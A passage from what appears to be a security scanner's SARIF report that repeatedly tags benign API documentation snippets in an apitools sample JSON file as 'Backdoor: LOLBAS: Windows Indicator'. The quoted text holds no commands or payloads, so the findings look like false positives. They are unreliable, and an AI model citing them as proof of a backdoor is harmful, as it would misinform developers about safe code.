                    "rendered": {
                      "text": "hitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen\\/used by the group of users controlled by the\\nadministrator of the pr",
                      "markdown": "`hitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen\\/used by the group of users controlled by the\\nadministrator of the pr`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1202,
                  "startColumn": 92,
                  "endLine": 1202,
                  "endColumn": 101,
                  "snippet": {
                    "text": "sage of a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of",
                    "rendered": {
                      "text": "sage of a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of",
                      "markdown": "`sage of a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1112,
                  "startColumn": 489,
                  "endLine": 1112,
                  "endColumn": 493,
                  "snippet": {
                    "text": "d Platform\\\". Users can consent to a scope for an application,\\ngiving it permission to access that data on their behalf.\\n\\nOAuth scope specifications should be fairly coarse grained; a user will need\\nto see and understand the text description of what your scope means.\\n\\nIn most cases: use one or at most two OAuth scopes for an entire family of\\nproducts. If your product has multiple APIs, you should probably be sharing\\nthe OAuth scope across all of those APIs.\\n\\nWhen you need finer grained OAuth consent screens: talk with your product\\nmanagement about how developers will use them in practic",
                    "rendered": {
                      "text": "d Platform\\\". Users can consent to a scope for an application,\\ngiving it permission to access that data on their behalf.\\n\\nOAuth scope specifications should be fairly coarse grained; a user will need\\nto see and understand the text description of what your scope means.\\n\\nIn most cases: use one or at most two OAuth scopes for an entire family of\\nproducts. If your product has multiple APIs, you should probably be sharing\\nthe OAuth scope across all of those APIs.\\n\\nWhen you need finer grained OAuth consent screens: talk with your product\\nmanagement about how developers will use them in practic",
                      "markdown": "`d Platform\\\". Users can consent to a scope for an application,\\ngiving it permission to access that data on their behalf.\\n\\nOAuth scope specifications should be fairly coarse grained; a user will need\\nto see and understand the text description of what your scope means.\\n\\nIn most cases: use one or at most two OAuth scopes for an entire family of\\nproducts. If your product has multiple APIs, you should probably be sharing\\nthe OAuth scope across all of those APIs.\\n\\nWhen you need finer grained OAuth consent screens: talk with your product\\nmanagement about how developers will use them in practic`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 977,
                  "startColumn": 130,
                  "endLine": 977,
                  "endColumn": 134,
                  "snippet": {
                    "text": "    },\n    \"QuotaLimit\": {\n      \"id\": \"QuotaLimit\",\n      \"description\": \"`QuotaLimit` defines a specific limit that applies over a specified duration\\nfor a limit type. There can be at most one limit for a duration and limit\\ntype combination defined within a `QuotaGroup`.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n",
                    "rendered": {
                      "text": "    },\n    \"QuotaLimit\": {\n      \"id\": \"QuotaLimit\",\n      \"description\": \"`QuotaLimit` defines a specific limit that applies over a specified duration\\nfor a limit type. There can be at most one limit for a duration and limit\\ntype combination defined within a `QuotaGroup`.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n",
                      "markdown": "`    },\n    \"QuotaLimit\": {\n      \"id\": \"QuotaLimit\",\n      \"description\": \"`QuotaLimit` defines a specific limit that applies over a specified duration\\nfor a limit type. There can be at most one limit for a duration and limit\\ntype combination defined within a `QuotaGroup`.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 930,
                  "startColumn": 3067,
                  "endLine": 930,
                  "endColumn": 3075,
                  "snippet": {
                    "text": "adGroup and WriteGroup,\\neach defining its own daily and per-second limits. Note that One Platform\\nenforces per-second limits averaged over a duration of 100 seconds. The rules\\nmap ReadGroup for all methods, except for the Update and Delete methods.\\nThese two methods consume from WriteGroup, with Update method consuming at\\ntwice the rate as Delete method.\\n\\nMultiple quota groups can be specified for a method. The quota limits in all\\nof those groups will be enforced. Example:\\n\\n    quota:\\n      groups:\\n      - name: WriteGroup\\n        limits:\\n        - description: Daily Limit\\n          nam",
                    "rendered": {
                      "text": "adGroup and WriteGroup,\\neach defining its own daily and per-second limits. Note that One Platform\\nenforces per-second limits averaged over a duration of 100 seconds. The rules\\nmap ReadGroup for all methods, except for the Update and Delete methods.\\nThese two methods consume from WriteGroup, with Update method consuming at\\ntwice the rate as Delete method.\\n\\nMultiple quota groups can be specified for a method. The quota limits in all\\nof those groups will be enforced. Example:\\n\\n    quota:\\n      groups:\\n      - name: WriteGroup\\n        limits:\\n        - description: Daily Limit\\n          nam",
                      "markdown": "`adGroup and WriteGroup,\\neach defining its own daily and per-second limits. Note that One Platform\\nenforces per-second limits averaged over a duration of 100 seconds. The rules\\nmap ReadGroup for all methods, except for the Update and Delete methods.\\nThese two methods consume from WriteGroup, with Update method consuming at\\ntwice the rate as Delete method.\\n\\nMultiple quota groups can be specified for a method. The quota limits in all\\nof those groups will be enforced. Example:\\n\\n    quota:\\n      groups:\\n      - name: WriteGroup\\n        limits:\\n        - description: Daily Limit\\n          nam`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 930,
                  "startColumn": 2991,
                  "endLine": 930,
                  "endColumn": 2999,
                  "snippet": {
                    "text": " - group: WriteGroup\\n\\nHere, the configuration defines two quota groups: ReadGroup and WriteGroup,\\neach defining its own daily and per-second limits. Note that One Platform\\nenforces per-second limits averaged over a duration of 100 seconds. The rules\\nmap ReadGroup for all methods, except for the Update and Delete methods.\\nThese two methods consume from WriteGroup, with Update method consuming at\\ntwice the rate as Delete method.\\n\\nMultiple quota groups can be specified for a method. The quota limits in all\\nof those groups will be enforced. Example:\\n\\n    quota:\\n      groups:\\n      - name: Wr",
                    "rendered": {
                      "text": " - group: WriteGroup\\n\\nHere, the configuration defines two quota groups: ReadGroup and WriteGroup,\\neach defining its own daily and per-second limits. Note that One Platform\\nenforces per-second limits averaged over a duration of 100 seconds. The rules\\nmap ReadGroup for all methods, except for the Update and Delete methods.\\nThese two methods consume from WriteGroup, with Update method consuming at\\ntwice the rate as Delete method.\\n\\nMultiple quota groups can be specified for a method. The quota limits in all\\nof those groups will be enforced. Example:\\n\\n    quota:\\n      groups:\\n      - name: Wr",
                      "markdown": "` - group: WriteGroup\\n\\nHere, the configuration defines two quota groups: ReadGroup and WriteGroup,\\neach defining its own daily and per-second limits. Note that One Platform\\nenforces per-second limits averaged over a duration of 100 seconds. The rules\\nmap ReadGroup for all methods, except for the Update and Delete methods.\\nThese two methods consume from WriteGroup, with Update method consuming at\\ntwice the rate as Delete method.\\n\\nMultiple quota groups can be specified for a method. The quota limits in all\\nof those groups will be enforced. Example:\\n\\n    quota:\\n      groups:\\n      - name: Wr`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 930,
                  "startColumn": 292,
                  "endLine": 930,
                  "endColumn": 296,
                  "snippet": {
                    "text": "Quota\",\n      \"description\": \"Quota configuration helps to achieve fairness and budgeting in service\\nusage.\\n\\n- Fairness is achieved through the use of short-term quota limits\\n  that are usually defined over a time window of several seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually defined over a time window of one or more\\n  days. These limits help client applicati",
                    "rendered": {
                      "text": "Quota\",\n      \"description\": \"Quota configuration helps to achieve fairness and budgeting in service\\nusage.\\n\\n- Fairness is achieved through the use of short-term quota limits\\n  that are usually defined over a time window of several seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually defined over a time window of one or more\\n  days. These limits help client applicati",
                      "markdown": "`Quota\",\n      \"description\": \"Quota configuration helps to achieve fairness and budgeting in service\\nusage.\\n\\n- Fairness is achieved through the use of short-term quota limits\\n  that are usually defined over a time window of several seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually defined over a time window of one or more\\n  days. These limits help client applicati`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 839,
                  "startColumn": 4220,
                  "endLine": 839,
                  "endColumn": 4224,
                  "snippet": {
                    "text": "i!\\\")`\\n\\nNote that when using `*` in the body mapping, it is not possible to\\nhave HTTP parameters, as all fields not bound by the path end in\\nthe body. This makes this option more rarely used in practice of\\ndefining REST APIs. The common usage of `*` is in custom methods\\nwhich don't use the URL at all for transferring data.\\n\\nIt is possible to define multiple HTTP methods for one RPC by using\\nthe `additional_bindings` option. Example:\\n\\n```proto\\nservice Messaging {\\n  rpc GetMessage(GetMessageRequest) returns (Message) {\\n    option (google.api.http) = {\\n      get: \\\"\\/v1\\/messages\\/{mes",
                    "rendered": {
                      "text": "i!\\\")`\\n\\nNote that when using `*` in the body mapping, it is not possible to\\nhave HTTP parameters, as all fields not bound by the path end in\\nthe body. This makes this option more rarely used in practice of\\ndefining REST APIs. The common usage of `*` is in custom methods\\nwhich don't use the URL at all for transferring data.\\n\\nIt is possible to define multiple HTTP methods for one RPC by using\\nthe `additional_bindings` option. Example:\\n\\n```proto\\nservice Messaging {\\n  rpc GetMessage(GetMessageRequest) returns (Message) {\\n    option (google.api.http) = {\\n      get: \\\"\\/v1\\/messages\\/{mes",
                      "markdown": "`i!\\\")`\\n\\nNote that when using `*` in the body mapping, it is not possible to\\nhave HTTP parameters, as all fields not bound by the path end in\\nthe body. This makes this option more rarely used in practice of\\ndefining REST APIs. The common usage of `*` is in custom methods\\nwhich don't use the URL at all for transferring data.\\n\\nIt is possible to define multiple HTTP methods for one RPC by using\\nthe `additional_bindings` option. Example:\\n\\n```proto\\nservice Messaging {\\n  rpc GetMessage(GetMessageRequest) returns (Message) {\\n    option (google.api.http) = {\\n      get: \\\"\\/v1\\/messages\\/{mes`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 839,
                  "startColumn": 3452,
                  "endLine": 839,
                  "endColumn": 3460,
                  "snippet": {
                    "text": "\"text\\\": \\\"Hi!\\\" }` | `UpdateMessage(message_id: \\\"123456\\\" message { text: \\\"Hi!\\\" })`\\n\\nThe special name `*` can be used in the body mapping to define that\\nevery field not bound by the path template should be mapped to the\\nrequest body.  This enables the following alternative definition of\\nthe update method:\\n\\n```proto\\nservice Messaging {\\n  rpc UpdateMessage(Message) returns (Message) {\\n    option (google.api.http) = {\\n      put: \\\"\\/v1\\/messages\\/{message_id}\\\"\\n      body: \\\"*\\\"\\n    };\\n  }\\n}\\nmessage Message {\\n  string message_id = 1;\\n  string text = 2;\\n}\\n```\\n\\nThe following HTTP ",
                    "rendered": {
                      "text": "\"text\\\": \\\"Hi!\\\" }` | `UpdateMessage(message_id: \\\"123456\\\" message { text: \\\"Hi!\\\" })`\\n\\nThe special name `*` can be used in the body mapping to define that\\nevery field not bound by the path template should be mapped to the\\nrequest body.  This enables the following alternative definition of\\nthe update method:\\n\\n```proto\\nservice Messaging {\\n  rpc UpdateMessage(Message) returns (Message) {\\n    option (google.api.http) = {\\n      put: \\\"\\/v1\\/messages\\/{message_id}\\\"\\n      body: \\\"*\\\"\\n    };\\n  }\\n}\\nmessage Message {\\n  string message_id = 1;\\n  string text = 2;\\n}\\n```\\n\\nThe following HTTP ",
                      "markdown": "`\"text\\\": \\\"Hi!\\\" }` | `UpdateMessage(message_id: \\\"123456\\\" message { text: \\\"Hi!\\\" })`\\n\\nThe special name `*` can be used in the body mapping to define that\\nevery field not bound by the path template should be mapped to the\\nrequest body.  This enables the following alternative definition of\\nthe update method:\\n\\n```proto\\nservice Messaging {\\n  rpc UpdateMessage(Message) returns (Message) {\\n    option (google.api.http) = {\\n      put: \\\"\\/v1\\/messages\\/{message_id}\\\"\\n      body: \\\"*\\\"\\n    };\\n  }\\n}\\nmessage Message {\\n  string message_id = 1;\\n  string text = 2;\\n}\\n```\\n\\nThe following HTTP `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 839,
                  "startColumn": 2534,
                  "endLine": 839,
                  "endColumn": 2542,
                  "snippet": {
                    "text": "t have a\\nprimitive type or a repeated primitive type. Message types are not\\nallowed. In the case of a repeated type, the parameter can be\\nrepeated in the URL, as in `...?param=A&param=B`.\\n\\nFor HTTP method kinds which allow a request body, the `body` field\\nspecifies the mapping. Consider a REST update method on the\\nmessage resource collection:\\n\\n```proto\\nservice Messaging {\\n  rpc UpdateMessage(UpdateMessageRequest) returns (Message) {\\n    option (google.api.http) = {\\n      put: \\\"\\/v1\\/messages\\/{message_id}\\\"\\n      body: \\\"message\\\"\\n    };\\n  }\\n}\\nmessage UpdateMessageRequest {\\n  strin",
                    "rendered": {
                      "text": "t have a\\nprimitive type or a repeated primitive type. Message types are not\\nallowed. In the case of a repeated type, the parameter can be\\nrepeated in the URL, as in `...?param=A&param=B`.\\n\\nFor HTTP method kinds which allow a request body, the `body` field\\nspecifies the mapping. Consider a REST update method on the\\nmessage resource collection:\\n\\n```proto\\nservice Messaging {\\n  rpc UpdateMessage(UpdateMessageRequest) returns (Message) {\\n    option (google.api.http) = {\\n      put: \\\"\\/v1\\/messages\\/{message_id}\\\"\\n      body: \\\"message\\\"\\n    };\\n  }\\n}\\nmessage UpdateMessageRequest {\\n  strin",
                      "markdown": "`t have a\\nprimitive type or a repeated primitive type. Message types are not\\nallowed. In the case of a repeated type, the parameter can be\\nrepeated in the URL, as in `...?param=A&param=B`.\\n\\nFor HTTP method kinds which allow a request body, the `body` field\\nspecifies the mapping. Consider a REST update method on the\\nmessage resource collection:\\n\\n```proto\\nservice Messaging {\\n  rpc UpdateMessage(UpdateMessageRequest) returns (Message) {\\n    option (google.api.http) = {\\n      put: \\\"\\/v1\\/messages\\/{message_id}\\\"\\n      body: \\\"message\\\"\\n    };\\n  }\\n}\\nmessage UpdateMessageRequest {\\n  strin`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 784,
                  "startColumn": 65,
                  "endLine": 784,
                  "endColumn": 69,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"enforceRuntimeVisibility\": {\n          \"description\": \"Controls whether visibility is enforced at runtime for requests to an API\\nmethod. This setting has meaning only when the selector applies to a method\\nor an API.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. The default is determined by the value of\\ngoogle.api.Visibility.enforce_runtime_visibility.\",\n          \"type\": \"boolean\"\n        }\n      }\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"enforceRuntimeVisibility\": {\n          \"description\": \"Controls whether visibility is enforced at runtime for requests to an API\\nmethod. This setting has meaning only when the selector applies to a method\\nor an API.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. The default is determined by the value of\\ngoogle.api.Visibility.enforce_runtime_visibility.\",\n          \"type\": \"boolean\"\n        }\n      }\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"enforceRuntimeVisibility\": {\n          \"description\": \"Controls whether visibility is enforced at runtime for requests to an API\\nmethod. This setting has meaning only when the selector applies to a method\\nor an API.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. The default is determined by the value of\\ngoogle.api.Visibility.enforce_runtime_visibility.\",\n          \"type\": \"boolean\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 765,
                  "startColumn": 72,
                  "endLine": 765,
                  "endColumn": 76,
                  "snippet": {
                    "text": "sibility rules providing visibility configuration for\\nindividual API elements.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"VisibilityRule\"\n          }\n        },\n        \"enforceRuntimeVisibility\": {\n          \"description\": \"Controls whether visibility rules are enforced at runtime for requests to\\nall APIs and methods.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. In service config version 0, the default is false.\\nIn later config versions, it's true.\\n\\nNote, th",
                    "rendered": {
                      "text": "sibility rules providing visibility configuration for\\nindividual API elements.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"VisibilityRule\"\n          }\n        },\n        \"enforceRuntimeVisibility\": {\n          \"description\": \"Controls whether visibility rules are enforced at runtime for requests to\\nall APIs and methods.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. In service config version 0, the default is false.\\nIn later config versions, it's true.\\n\\nNote, th",
                      "markdown": "`sibility rules providing visibility configuration for\\nindividual API elements.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"VisibilityRule\"\n          }\n        },\n        \"enforceRuntimeVisibility\": {\n          \"description\": \"Controls whether visibility rules are enforced at runtime for requests to\\nall APIs and methods.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. In service config version 0, the default is false.\\nIn later config versions, it's true.\\n\\nNote, th`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 739,
                  "startColumn": 201,
                  "endLine": 739,
                  "endColumn": 205,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"selector\": {\n          \"description\": \"The selector is a comma-separated list of patterns. Each pattern is a\\nqualified name of the element which may end in \\\"*\\\", indicating a wildcard.\\nWildcards are only allowed at the end and for a whole component of the\\nqualified name, i.e. \\\"foo.*\\\" is ok, but not \\\"foo.b*\\\" or \\\"foo.*.bar\\\". To\\nspecify a default for all applicable elements, the whole pattern \\\"*\\\"\\nis used.\",\n          \"type\": \"string\"\n        },\n        \"description\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"selector\": {\n          \"description\": \"The selector is a comma-separated list of patterns. Each pattern is a\\nqualified name of the element which may end in \\\"*\\\", indicating a wildcard.\\nWildcards are only allowed at the end and for a whole component of the\\nqualified name, i.e. \\\"foo.*\\\" is ok, but not \\\"foo.b*\\\" or \\\"foo.*.bar\\\". To\\nspecify a default for all applicable elements, the whole pattern \\\"*\\\"\\nis used.\",\n          \"type\": \"string\"\n        },\n        \"description\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"selector\": {\n          \"description\": \"The selector is a comma-separated list of patterns. Each pattern is a\\nqualified name of the element which may end in \\\"*\\\", indicating a wildcard.\\nWildcards are only allowed at the end and for a whole component of the\\nqualified name, i.e. \\\"foo.*\\\" is ok, but not \\\"foo.b*\\\" or \\\"foo.*.bar\\\". To\\nspecify a default for all applicable elements, the whole pattern \\\"*\\\"\\nis used.\",\n          \"type\": \"string\"\n        },\n        \"description\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 680,
                  "startColumn": 1054,
                  "endLine": 680,
                  "endColumn": 1058,
                  "snippet": {
                    "text": "eatures, definition lists, tables and fenced\\ncode blocks are supported. Section headers can be provided and are\\ninterpreted relative to the section nesting of the context where\\na documentation fragment is embedded.\\n\\nDocumentation from the IDL is merged with documentation defined\\nvia the config at normalization time, where documentation provided\\nby config rules overrides IDL provided.\\n\\nA number of constructs specific to the API platform are supported\\nin documentation text.\\n\\nIn order to reference a proto element, the following\\nnotation can be used:\\n<pre><code>&#91;fully.qualified.proto",
                    "rendered": {
                      "text": "eatures, definition lists, tables and fenced\\ncode blocks are supported. Section headers can be provided and are\\ninterpreted relative to the section nesting of the context where\\na documentation fragment is embedded.\\n\\nDocumentation from the IDL is merged with documentation defined\\nvia the config at normalization time, where documentation provided\\nby config rules overrides IDL provided.\\n\\nA number of constructs specific to the API platform are supported\\nin documentation text.\\n\\nIn order to reference a proto element, the following\\nnotation can be used:\\n<pre><code>&#91;fully.qualified.proto",
                      "markdown": "`eatures, definition lists, tables and fenced\\ncode blocks are supported. Section headers can be provided and are\\ninterpreted relative to the section nesting of the context where\\na documentation fragment is embedded.\\n\\nDocumentation from the IDL is merged with documentation defined\\nvia the config at normalization time, where documentation provided\\nby config rules overrides IDL provided.\\n\\nA number of constructs specific to the API platform are supported\\nin documentation text.\\n\\nIn order to reference a proto element, the following\\nnotation can be used:\\n<pre><code>&#91;fully.qualified.proto`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 55,
                  "endLine": 268,
                  "endColumn": 64,
                  "snippet": {
                    "text": "          \"$ref\": \"ProjectProperties\"\n        },\n        \"control\": {\n          \"description\": \"Configuration for the service control plane.\",\n          \"$ref\": \"Control\"\n        },\n        \"logs\": {\n",
                    "rendered": {
                      "text": "          \"$ref\": \"ProjectProperties\"\n        },\n        \"control\": {\n          \"description\": \"Configuration for the service control plane.\",\n          \"$ref\": \"Control\"\n        },\n        \"logs\": {\n",
                      "markdown": "`          \"$ref\": \"ProjectProperties\"\n        },\n        \"control\": {\n          \"description\": \"Configuration for the service control plane.\",\n          \"$ref\": \"Control\"\n        },\n        \"logs\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 191,
                  "startColumn": 41,
                  "endLine": 191,
                  "endColumn": 45,
                  "snippet": {
